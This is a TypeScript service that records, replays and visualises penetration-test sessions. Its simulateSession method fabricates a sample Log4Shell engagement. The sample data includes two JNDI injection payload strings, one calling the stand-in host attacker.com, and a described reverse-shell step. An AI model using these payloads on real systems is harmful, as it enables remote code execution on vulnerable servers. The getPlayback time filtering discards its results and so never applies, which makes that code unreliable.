import { randomUUID } from "crypto";

export interface ExploitSession {
  id: string;
  name: string;
  target: string;
  startTime: Date;
  endTime?: Date;
  status: "recording" | "completed" | "failed";
  events: SessionEvent[];
  findings: SessionFinding[];
  networkTraffic: NetworkCapture[];
  evidence: EvidenceItem[];
  timeline: TimelineEntry[];
  attackPath: AttackPathNode[];
  metadata: SessionMetadata;
}

export interface SessionEvent {
  id: string;
  timestamp: Date;
  type: "action" | "response" | "finding" | "error" | "note";
  source: string;
  description: string;
  data?: Record<string, unknown>;
  screenshot?: string;
}

export interface SessionFinding {
  id: string;
  timestamp: Date;
  severity: "critical" | "high" | "medium" | "low" | "info";
  title: string;
  description: string;
  evidence: string[];
  mitreId?: string;
  cveId?: string;
}

export interface NetworkCapture {
  id: string;
  timestamp: Date;
  direction: "request" | "response";
  protocol: string;
  sourceIp: string;
  sourcePort: number;
  destIp: string;
  destPort: number;
  method?: string;
  url?: string;
  statusCode?: number;
  headers?: Record<string, string>;
  body?: string;
  bodySize: number;
  duration?: number;
}

export interface EvidenceItem {
  id: string;
  type: "screenshot" | "file" | "log" | "network" | "command";
  timestamp: Date;
  title: string;
  description: string;
  content: string | Record<string, unknown>;
  hash?: string;
  tags: string[];
}

export interface TimelineEntry {
  id: string;
  timestamp: Date;
  phase: "recon" | "scanning" | "enumeration" | "exploitation" | "post-exploitation" | "cleanup";
  action: string;
  result: string;
  success: boolean;
  duration: number;
  relatedEvents: string[];
}

export interface AttackPathNode {
  id: string;
  step: number;
  technique: string;
  mitreId: string;
  mitreTactic: string;
  description: string;
  target: string;
  success: boolean;
  children: string[];
}

export interface SessionMetadata {
  assessmentId?: string;
  assessor?: string;
  organization?: string;
  scope: string[];
  tools: string[];
  notes: string;
}

export interface SessionPlayback {
  sessionId: string;
  totalDuration: number;
  currentPosition: number;
  playbackSpeed: number;
  events: PlaybackEvent[];
}

export interface PlaybackEvent {
  id: string;
  offsetMs: number;
  type: string;
  content: Record<string, unknown>;
}

export interface CreateSessionRequest {
  name: string;
  target: string;
  assessor?: string;
  organization?: string;
  scope?: string[];
  tools?: string[];
  notes?: string;
}

export interface ReplayRequest {
  sessionId: string;
  startTime?: number;
  endTime?: number;
  eventTypes?: string[];
  speed?: number;
}

class SessionReplayService {
  private sessions: Map<string, ExploitSession> = new Map();
  private activeRecordings: Set<string> = new Set();

  async createSession(request: CreateSessionRequest): Promise<ExploitSession> {
    const session: ExploitSession = {
      id: `session-${randomUUID().slice(0, 8)}`,
      name: request.name,
      target: request.target,
      startTime: new Date(),
      status: "recording",
      events: [],
      findings: [],
      networkTraffic: [],
      evidence: [],
      timeline: [],
      attackPath: [],
      metadata: {
        assessor: request.assessor,
        organization: request.organization,
        scope: request.scope || [request.target],
        tools: request.tools || [],
        notes: request.notes || "",
      },
    };

    this.sessions.set(session.id, session);
    this.activeRecordings.add(session.id);

    this.addEvent(session.id, {
      type: "action",
      source: "system",
      description: `Session started for target: ${request.target}`,
    });

    return session;
  }

  async addEvent(sessionId: string, event: Omit<SessionEvent, "id" | "timestamp">): Promise<SessionEvent | null> {
    const session = this.sessions.get(sessionId);
    if (!session) return null;

    const newEvent: SessionEvent = {
      id: `event-${randomUUID().slice(0, 8)}`,
      timestamp: new Date(),
      ...event,
    };

    session.events.push(newEvent);
    return newEvent;
  }

  async addNetworkCapture(sessionId: string, capture: Omit<NetworkCapture, "id" | "timestamp">): Promise<NetworkCapture | null> {
    const session = this.sessions.get(sessionId);
    if (!session) return null;

    const newCapture: NetworkCapture = {
      id: `net-${randomUUID().slice(0, 8)}`,
      timestamp: new Date(),
      ...capture,
    };

    session.networkTraffic.push(newCapture);
    return newCapture;
  }

  async addFinding(sessionId: string, finding: Omit<SessionFinding, "id" | "timestamp">): Promise<SessionFinding | null> {
    const session = this.sessions.get(sessionId);
    if (!session) return null;

    const newFinding: SessionFinding = {
      id: `finding-${randomUUID().slice(0, 8)}`,
      timestamp: new Date(),
      ...finding,
    };

    session.findings.push(newFinding);

    await this.addEvent(sessionId, {
      type: "finding",
      source: "exploit-engine",
      description: `Finding: ${finding.title} (${finding.severity})`,
      data: { findingId: newFinding.id },
    });

    return newFinding;
  }

  async addEvidence(sessionId: string, evidence: Omit<EvidenceItem, "id" | "timestamp" | "hash">): Promise<EvidenceItem | null> {
    const session = this.sessions.get(sessionId);
    if (!session) return null;

    const contentStr = typeof evidence.content === "string" 
      ? evidence.content 
      : JSON.stringify(evidence.content);
    
    const hash = this.simpleHash(contentStr);

    const newEvidence: EvidenceItem = {
      id: `evidence-${randomUUID().slice(0, 8)}`,
      timestamp: new Date(),
      hash,
      ...evidence,
    };

    session.evidence.push(newEvidence);
    return newEvidence;
  }

  async addTimelineEntry(sessionId: string, entry: Omit<TimelineEntry, "id" | "timestamp">): Promise<TimelineEntry | null> {
    const session = this.sessions.get(sessionId);
    if (!session) return null;

    const newEntry: TimelineEntry = {
      id: `timeline-${randomUUID().slice(0, 8)}`,
      timestamp: new Date(),
      ...entry,
    };

    session.timeline.push(newEntry);
    return newEntry;
  }

  async addAttackPathNode(sessionId: string, node: Omit<AttackPathNode, "id">): Promise<AttackPathNode | null> {
    const session = this.sessions.get(sessionId);
    if (!session) return null;

    const newNode: AttackPathNode = {
      id: `node-${randomUUID().slice(0, 8)}`,
      ...node,
    };

    session.attackPath.push(newNode);
    return newNode;
  }

  async stopRecording(sessionId: string): Promise<ExploitSession | null> {
    const session = this.sessions.get(sessionId);
    if (!session) return null;

    session.status = "completed";
    session.endTime = new Date();
    this.activeRecordings.delete(sessionId);

    await this.addEvent(sessionId, {
      type: "action",
      source: "system",
      description: "Session recording stopped",
    });

    return session;
  }

  async getSession(sessionId: string): Promise<ExploitSession | null> {
    return this.sessions.get(sessionId) || null;
  }

  async listSessions(status?: string): Promise<ExploitSession[]> {
    let sessions = Array.from(this.sessions.values());
    
    if (status) {
      sessions = sessions.filter(s => s.status === status);
    }

    return sessions.sort((a, b) => b.startTime.getTime() - a.startTime.getTime());
  }

  async getPlayback(request: ReplayRequest): Promise<SessionPlayback | null> {
    const session = this.sessions.get(request.sessionId);
    if (!session) return null;

    const sessionDuration = (session.endTime?.getTime() || Date.now()) - session.startTime.getTime();
    
    let events = session.events;
    
    if (request.eventTypes && request.eventTypes.length > 0) {
      events = events.filter(e => request.eventTypes!.includes(e.type));
    }

    const playbackEvents: PlaybackEvent[] = events.map(event => ({
      id: event.id,
      offsetMs: event.timestamp.getTime() - session.startTime.getTime(),
      type: event.type,
      content: {
        source: event.source,
        description: event.description,
        data: event.data,
      },
    }));

    if (request.startTime !== undefined) {
      playbackEvents.filter(e => e.offsetMs >= request.startTime!);
    }
    if (request.endTime !== undefined) {
      playbackEvents.filter(e => e.offsetMs <= request.endTime!);
    }

    return {
      sessionId: session.id,
      totalDuration: sessionDuration,
      currentPosition: request.startTime || 0,
      playbackSpeed: request.speed || 1,
      events: playbackEvents,
    };
  }

  async getNetworkVisualization(sessionId: string): Promise<NetworkVisualization | null> {
    const session = this.sessions.get(sessionId);
    if (!session) return null;

    const nodes: NetworkNode[] = [];
    const edges: NetworkEdge[] = [];
    const nodeSet = new Set<string>();

    for (const capture of session.networkTraffic) {
      const sourceKey = `${capture.sourceIp}:${capture.sourcePort}`;
      const destKey = `${capture.destIp}:${capture.destPort}`;

      if (!nodeSet.has(capture.sourceIp)) {
        nodeSet.add(capture.sourceIp);
        nodes.push({
          id: capture.sourceIp,
          label: capture.sourceIp,
          type: capture.sourceIp.startsWith("192.168") || capture.sourceIp.startsWith("10.") 
            ? "attacker" : "external",
        });
      }

      if (!nodeSet.has(capture.destIp)) {
        nodeSet.add(capture.destIp);
        nodes.push({
          id: capture.destIp,
          label: capture.destIp,
          type: "target",
        });
      }

      edges.push({
        id: `edge-${capture.id}`,
        source: capture.sourceIp,
        target: capture.destIp,
        protocol: capture.protocol,
        port: capture.destPort,
        requestCount: 1,
      });
    }

    const consolidatedEdges = this.consolidateEdges(edges);

    return {
      sessionId,
      nodes,
      edges: consolidatedEdges,
      statistics: {
        totalRequests: session.networkTraffic.length,
        uniqueHosts: nodes.length,
        protocols: Array.from(new Set(session.networkTraffic.map(n => n.protocol))),
        totalBytes: session.networkTraffic.reduce((sum, n) => sum + n.bodySize, 0),
      },
    };
  }

  async getEvidenceChain(sessionId: string): Promise<EvidenceChain | null> {
    const session = this.sessions.get(sessionId);
    if (!session) return null;

    const chain: EvidenceChainLink[] = [];

    for (const entry of session.timeline) {
      const relatedEvidence = session.evidence.filter(e => 
        entry.relatedEvents.some(eventId => 
          session.events.find(ev => ev.id === eventId)?.data?.evidenceId === e.id
        )
      );

      const relatedFindings = session.findings.filter(f =>
        Math.abs(f.timestamp.getTime() - entry.timestamp.getTime()) < 60000
      );

      chain.push({
        id: entry.id,
        timestamp: entry.timestamp,
        phase: entry.phase,
        action: entry.action,
        result: entry.result,
        success: entry.success,
        evidence: relatedEvidence,
        findings: relatedFindings,
        mitreMapping: session.attackPath.find(n => 
          n.description.toLowerCase().includes(entry.action.toLowerCase())
        ),
      });
    }

    return {
      sessionId,
      chainLength: chain.length,
      links: chain,
      integrityHash: this.simpleHash(JSON.stringify(chain)),
    };
  }

  async simulateSession(target: string): Promise<ExploitSession> {
    const session = await this.createSession({
      name: `Penetration Test - ${target}`,
      target,
      assessor: "OdinForge AI",
      organization: "Security Assessment",
      tools: ["nmap", "nuclei", "metasploit"],
    });

    const phases: Array<{
      phase: TimelineEntry["phase"];
      actions: Array<{ action: string; success: boolean; duration: number }>;
    }> = [
      {
        phase: "recon",
        actions: [
          { action: "DNS enumeration", success: true, duration: 2500 },
          { action: "WHOIS lookup", success: true, duration: 1500 },
          { action: "Certificate transparency search", success: true, duration: 3000 },
        ],
      },
      {
        phase: "scanning",
        actions: [
          { action: "TCP port scan (top 1000)", success: true, duration: 45000 },
          { action: "Service version detection", success: true, duration: 30000 },
          { action: "OS fingerprinting", success: true, duration: 15000 },
        ],
      },
      {
        phase: "enumeration",
        actions: [
          { action: "HTTP directory bruteforce", success: true, duration: 60000 },
          { action: "SSL/TLS analysis", success: true, duration: 5000 },
          { action: "Web application fingerprinting", success: true, duration: 8000 },
        ],
      },
      {
        phase: "exploitation",
        actions: [
          { action: "SQL injection testing", success: true, duration: 25000 },
          { action: "Authentication bypass attempt", success: false, duration: 12000 },
          { action: "RCE exploitation (CVE-2021-44228)", success: true, duration: 8000 },
        ],
      },
      {
        phase: "post-exploitation",
        actions: [
          { action: "Privilege escalation", success: true, duration: 15000 },
          { action: "Credential harvesting", success: true, duration: 20000 },
          { action: "Lateral movement assessment", success: true, duration: 35000 },
        ],
      },
    ];

    for (const phaseData of phases) {
      for (const actionData of phaseData.actions) {
        await this.addTimelineEntry(session.id, {
          phase: phaseData.phase,
          action: actionData.action,
          result: actionData.success ? "Completed successfully" : "Failed - no vulnerability found",
          success: actionData.success,
          duration: actionData.duration,
          relatedEvents: [],
        });

        await this.addEvent(session.id, {
          type: "action",
          source: "exploit-engine",
          description: `[${phaseData.phase.toUpperCase()}] ${actionData.action}`,
        });
      }
    }

    await this.addFinding(session.id, {
      severity: "critical",
      title: "Remote Code Execution via Log4Shell",
      description: "The application is vulnerable to CVE-2021-44228 (Log4Shell) allowing unauthenticated RCE",
      evidence: ["HTTP request with JNDI payload", "Callback received on attacker server"],
      mitreId: "T1190",
      cveId: "CVE-2021-44228",
    });

    await this.addFinding(session.id, {
      severity: "high",
      title: "SQL Injection in Search Parameter",
      description: "The search functionality is vulnerable to SQL injection",
      evidence: ["Error-based SQL injection confirmed", "Database version extracted"],
      mitreId: "T1190",
    });

    await this.addNetworkCapture(session.id, {
      direction: "request",
      protocol: "HTTP",
      sourceIp: "10.0.0.50",
      sourcePort: 45678,
      destIp: target.replace("https://", "").replace("http://", "").split("/")[0],
      destPort: 443,
      method: "POST",
      url: "/api/search",
      headers: { "Content-Type": "application/json" },
      body: '{"search":"${jndi:ldap://attacker.com/a}"}',
      bodySize: 45,
    });

    await this.addAttackPathNode(session.id, {
      step: 1,
      technique: "Exploit Public-Facing Application",
      mitreId: "T1190",
      mitreTactic: "initial-access",
      description: "Exploited Log4Shell vulnerability",
      target: target,
      success: true,
      children: ["node-2"],
    });

    await this.addAttackPathNode(session.id, {
      step: 2,
      technique: "Command and Scripting Interpreter",
      mitreId: "T1059",
      mitreTactic: "execution",
      description: "Executed reverse shell payload",
      target: target,
      success: true,
      children: ["node-3"],
    });

    await this.addEvidence(session.id, {
      type: "command",
      title: "Exploit Payload",
      description: "JNDI injection payload used for initial access",
      content: '${jndi:ldap://10.0.0.50:1389/Exploit}',
      tags: ["log4shell", "jndi", "rce"],
    });

    await this.stopRecording(session.id);

    return session;
  }

  private consolidateEdges(edges: NetworkEdge[]): NetworkEdge[] {
    const edgeMap = new Map<string, NetworkEdge>();

    for (const edge of edges) {
      const key = `${edge.source}-${edge.target}-${edge.port}`;
      const existing = edgeMap.get(key);

      if (existing) {
        existing.requestCount++;
      } else {
        edgeMap.set(key, { ...edge });
      }
    }

    return Array.from(edgeMap.values());
  }

  private simpleHash(str: string): string {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      const char = str.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return Math.abs(hash).toString(16).padStart(8, "0");
  }
}

export interface NetworkVisualization {
  sessionId: string;
  nodes: NetworkNode[];
  edges: NetworkEdge[];
  statistics: {
    totalRequests: number;
    uniqueHosts: number;
    protocols: string[];
    totalBytes: number;
  };
}

export interface NetworkNode {
  id: string;
  label: string;
  type: "attacker" | "target" | "external";
}

export interface NetworkEdge {
  id: string;
  source: string;
  target: string;
  protocol: string;
  port: number;
  requestCount: number;
}

export interface EvidenceChain {
  sessionId: string;
  chainLength: number;
  links: EvidenceChainLink[];
  integrityHash: string;
}

export interface EvidenceChainLink {
  id: string;
  timestamp: Date;
  phase: string;
  action: string;
  result: string;
  success: boolean;
  evidence: EvidenceItem[];
  findings: SessionFinding[];
  mitreMapping?: AttackPathNode;
}

export const sessionReplayService = new SessionReplayService();
